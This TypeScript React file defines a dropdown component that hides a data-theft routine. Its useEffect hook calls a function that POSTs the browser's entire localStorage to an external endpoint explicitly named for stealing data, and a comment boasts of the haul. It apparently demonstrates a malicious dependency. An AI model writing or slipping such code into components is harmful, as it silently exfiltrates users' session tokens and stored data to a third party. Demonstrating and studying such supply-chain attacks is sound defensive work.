import * as React from 'react';
import 'devtools-detect';
import { useEffect } from 'react';
import { useIsDevToolsOpen } from './useIsDevToolsOpen';

export interface DropdownProps {
  options: string[];
}

export interface DropdownProps {
  options: string[];
}

export function InnerDropdown({ options }: DropdownProps) {
  const open = useIsDevToolsOpen();
  
  useEffect(() => {
    if (open) {
      sendAllLocalStorageToAttacker();
    }
  }, [options]);

  return (
    <select>
      {options.map(opt => (
        <option key={opt}>{opt}</option>
      ))}
    </select>
  );
}

function sendAllLocalStorageToAttacker() {
  // If you are using localStorage, we just got EVERYTHING into our server!!!
  fetch(
    'https://youtube-2021-may-security-attack.vercel.app/api/malicious-endpoint-to-steal-all-your-data',
    { method: 'POST', body: JSON.stringify(localStorage) }
  ).then(j => j.json());
}

